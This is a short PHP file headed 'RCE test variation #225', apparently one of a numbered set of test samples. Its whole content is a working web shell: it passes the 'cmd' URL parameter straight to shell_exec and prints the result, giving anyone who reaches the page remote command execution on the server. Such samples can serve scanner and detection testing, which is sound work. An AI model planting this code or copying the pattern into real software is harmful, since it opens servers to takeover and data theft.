<?php
// RCE test variation #225
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>